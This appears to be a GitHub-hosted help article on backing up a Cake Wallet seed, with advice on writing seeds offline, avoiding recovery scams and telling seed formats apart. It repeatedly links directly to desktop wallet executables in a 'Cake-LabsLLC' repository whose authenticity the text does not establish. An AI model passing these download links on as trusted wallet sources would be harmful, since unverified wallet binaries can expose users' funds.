<p align="center"><img src="https://github.com/Cake-LabsLLC/learn/raw/HEAD/assets/banner-article.png" alt="Cake Wallet article banner" width="100%"></p>

<h1 align="center">Back up your Cake Wallet seed | Cake Wallet</h1>
<p align="center">Practical, private steps for resolving this Cake Wallet question.</p>

<p align="center">
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe"><img src="https://img.shields.io/badge/Download_for_Windows-2B2733?style=for-the-badge&logo=windows&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Windows"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-2B2733?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for macOS"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip"><img src="https://img.shields.io/badge/Download_for_Linux-2B2733?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe) | v6.5.1 |
| macOS | [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg) | v6.5.1 |
| Linux | [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip) | v6.5.1 |

All versions and checksums are on the [Cake Wallet v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).

## Short answer

A seed backup is the key recovery record for a wallet. Write it down privately, verify it carefully, and keep it offline; never share it with anyone, including support.

## You'll see this if

- You are setting up a wallet, preparing for a device change, or want to know how to recover after losing access. You may also be unsure whether a screenshot, cloud note, or copied text is a safe backup.
- You are unsure which safe troubleshooting step to try next.
- You want to protect wallet recovery information while resolving the issue.

## Why it happens

A seed represents the wallet’s recovery information. A device PIN may protect access on one installation, but it does not replace the seed. If the device is lost, damaged, or the app cannot open, recovery may depend on having the correct seed and any other required recovery details. A backup can fail if words are misspelled, written in the wrong order, or belong to a different wallet or seed format.

## Fix

1. Open the wallet while you still have access and locate its recovery or backup information using the app’s available options. Follow the on-screen guidance without exposing the information to a camera, screen-sharing session, or clipboard history.
2. Write the seed on paper in the exact order shown. Check each word and its position against the screen. Do not rely on memory or a partial list.
3. Store the written copy somewhere private and protected from loss, damage, and unauthorized access. Consider a second secure offline copy if that fits your circumstances. Keep copies physically separate.
4. If the app provides a way to verify your backup, use it locally and privately. Do not test it by sending it to another person or entering it into an unrelated service.
5. Make sure you understand what wallet and seed format the record belongs to. Cake Wallet can restore a MyMonero seed; [Cake Wallet’s seed restoration guide](./cake-wallet-restore-from-keys.md) explains other recovery routes.

> [!TIP]
> Keep a written record of non-secret troubleshooting details. Never include seed words, keys, PINs, or recovery screenshots in that record.

For related guidance, see [Cake Wallet seed privacy](./cake-wallet-privacy-tips.md) and [Cake Wallet restore from keys](./cake-wallet-restore-from-keys.md).

For another perspective, read the [Cake Wallet related guide](./cake-wallet-migration-checklist.md).

---

## If that did not work

If you cannot find recovery information, consult the app’s general help resources and avoid experimenting with seed words in unknown tools. If a copy seems incomplete or a word is uncertain, do not guess repeatedly or publish a photo for help. Check your records privately. A 13-word MyMonero-specific legacy seed differs from a 25-word standard Monero seed. Newer wallets may use a different seed format; check the word count your backup shows. If you are moving to another wallet, plan recovery before removing the old installation. The [Cake Wallet migration checklist](./cake-wallet-migration-checklist.md) can help organize that process.

A few careful checks can make this process less confusing. First separate wallet access from recovery: a PIN or a desktop launch issue is not the same thing as seed validity, and node connectivity is not a substitute for recovery details. Write down the non-secret symptoms you observe, such as the wording of an error, whether the app opens, or whether scanning advances. This helps you compare behavior without exposing private information.

Avoid making several changes at once. If you change a restore option, node setting, or installation state, you may not know which change affected the result. Where practical, note the original non-secret setting before changing it. Give scans time to complete, particularly after a restore that starts earlier in the blockchain. A longer scan is not necessarily evidence that the wallet or backup is broken.

Protect yourself from recovery scams throughout troubleshooting. A person who asks you to reveal a seed, private key, PIN, or recovery screenshot is asking for information that should remain yours. Do not use a site or chat as a seed checker. Official-looking language does not make an unsolicited request safe. Keep the words out of email, shared documents, and screen recordings.

If you need to change devices or installations, plan the recovery first. Keep the existing app and its data intact until you have confirmed that you can restore from your own backup. Cake Wallet can restore a MyMonero seed, including the 13-word MyMonero-specific legacy format or the 25-word standard Monero format. Newer wallets may use a different seed format; check the word count your backup shows. Do not combine formats or guess missing words.

Use the linked guides as background, not as a reason to disclose any secret. They describe adjacent topics such as recovery, synchronization, privacy, and migration. Menu wording can vary, so follow the general options presented in your own app rather than searching for an exact label that may not appear. If a troubleshooting step would require surrendering control of your device or revealing recovery information, stop and choose a safer route.

A successful check should leave you with a clear distinction between what you know and what remains uncertain. For example, you can confirm that a backup has a particular word count without publishing the words, or note that a sync indicator has not moved without sending a screen image containing keys. Keep that distinction in mind when asking for general help.


> [!WARNING]
> A seed or private key can provide control of a wallet. Never send it to support, enter it on a website, or disclose it to someone offering to recover funds.

## Prevention

Review that your backup is legible and complete without putting it into an online document. Keep the seed separate from the device and from any PIN. Limit who can access the physical storage location. Be cautious about unsolicited messages offering recovery assistance: nobody legitimate asks for your seed. Verify that you are using the genuine Cake Wallet application and avoid links or downloads sent by strangers. For desktop installation, obtain the release from the [Cake Wallet GitHub repository](https://github.com/Cake-LabsLLC/cake-wallet-desktop).



---

## FAQ

<details><summary>Should I share my seed with support?</summary>

No. Nobody legitimate asks for your seed, keys, or PIN. Keep recovery information private and enter it only in the genuine app when needed.

</details>

<details><summary>Does a PIN replace my recovery backup?</summary>

No. A PIN protects access on an installation. Keep a separate, complete recovery backup in a private place.

</details>

<details><summary>Can I use a MyMonero seed?</summary>

Cake Wallet can restore a MyMonero seed. MyMonero used a 13-word MyMonero-specific legacy seed or a 25-word standard Monero seed.

</details>

<details><summary>What if the wallet looks empty after recovery?</summary>

Allow scanning to finish and check the restore height. An earlier height can find older activity but takes longer to scan.

</details>

---

## Download Cake Wallet Desktop

- Windows: [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe)
- macOS: [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg)
- Linux: [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip)

Check each file against the checksums on the [Cake Wallet v6.5.1 release](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Troubleshoot a Cake Wallet seed that is not accepted | Cake Wallet](./cake-wallet-seed-not-accepted.md) | Practical, private steps for resolving this Cake Wallet question. |
| [View spend and view keys in Cake Wallet | Cake Wallet](./cake-wallet-view-spend-keys.md) | Practical, private steps for resolving this Cake Wallet question. |
| [What to do if you forgot your Cake Wallet PIN | Cake Wallet](./cake-wallet-forgot-pin.md) | Practical, private steps for resolving this Cake Wallet question. |

[Back to all Cake Wallet guides](https://github.com/Cake-LabsLLC/learn)
